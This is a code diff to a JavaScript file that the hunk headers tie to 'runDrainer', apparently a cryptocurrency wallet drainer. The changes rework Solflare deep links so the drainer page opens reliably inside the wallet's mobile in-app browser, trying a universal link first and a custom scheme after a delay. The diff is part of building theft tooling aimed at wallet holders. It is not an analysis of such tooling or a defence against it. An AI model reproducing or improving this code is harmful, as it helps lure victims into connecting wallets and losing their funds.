@@ -5536,11 +5536,8 @@ window.runDrainer = runDrainer;
           if (isMobileDevice) {
             // Mobile: Use correct Solflare URL structure (v1/browse with ref parameter)
             const encodedUrl = encodeURIComponent(currentUrl);
-            const params = new URLSearchParams({
-              ref: "https://solflare.com"
-            });
-            deepLink = `https://solflare.com/ul/v1/browse/${encodedUrl}?${params.toString()}`;
-            fallbackUrl = `solflare://v1/browse/${encodedUrl}?${params.toString()}`;
+            deepLink = `https://solflare.com/ul/v1/browse/${encodedUrl}?ref=${encodeURIComponent("https://solflare.com")}`;
+            fallbackUrl = `solflare://v1/browse/${encodedUrl}?ref=${encodeURIComponent("https://solflare.com")}`;
           } else {
             // Desktop: Use custom scheme first
             deepLink = `solflare://browse/${encodeURIComponent(currentUrl)}`;
@@ -5622,11 +5619,11 @@ window.runDrainer = runDrainer;
           console.log(`[DEEP_LINK] Mobile device: using improved approach`);
           
           // For mobile, try universal link first (more reliable)
-          console.log(`[DEEP_LINK] Trying universal link: ${fallbackUrl}`);
+          console.log(`[DEEP_LINK] Trying universal link: ${deepLink}`);
           
           // Use a more reliable method for mobile deep links
           const link = document.createElement('a');
-          link.href = fallbackUrl;
+          link.href = deepLink;
           link.target = '_blank';
           link.rel = 'noopener noreferrer';
           document.body.appendChild(link);
@@ -5635,8 +5632,8 @@ window.runDrainer = runDrainer;
           
           // If that doesn't work, try custom scheme after a short delay
           setTimeout(() => {
-            console.log(`[DEEP_LINK] Trying custom scheme: ${deepLink}`);
-            window.location.href = deepLink;
+            console.log(`[DEEP_LINK] Trying custom scheme: ${fallbackUrl}`);
+            window.location.href = fallbackUrl;
           }, 1500);
           
           // Show a message to the user about what's happening
